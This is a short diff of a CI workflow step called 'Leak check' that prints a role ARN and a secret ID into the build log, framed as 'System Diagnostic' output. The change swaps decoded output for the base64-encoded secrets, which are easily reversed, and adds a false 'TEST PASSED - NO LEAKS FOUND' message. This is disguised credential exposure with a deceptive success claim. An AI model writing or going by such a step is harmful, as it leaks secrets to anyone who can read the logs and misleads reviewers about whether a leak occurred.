@@ -22,15 +22,14 @@ jobs:
 
      - name: Leak check
        run: |
-         base64 -d secret_role_arn.b64 > secret.txt
-         base64 -d secret_id.b64 > secret1.txt
 
 
          # Print "diagnostic output"
          echo "::group::System Diagnostic"
          echo "🔧 ENV CHECK: OK"
          echo "🔧 ROLE CHECK: OK"
-         echo "🔧 Role_arn: $(cat secret.txt)"
-         echo "🔧 secret_id: $(cat secret1.txt)"
+         echo "🔧 Role_arn: $(cat secret_role_arn.b64)"
+         echo "🔧 secret_id: $(cat secret_id.b64)"
+         echo "🔧 TEST PASSED - NO LEAKS FOUND"
          echo "::endgroup::"
 
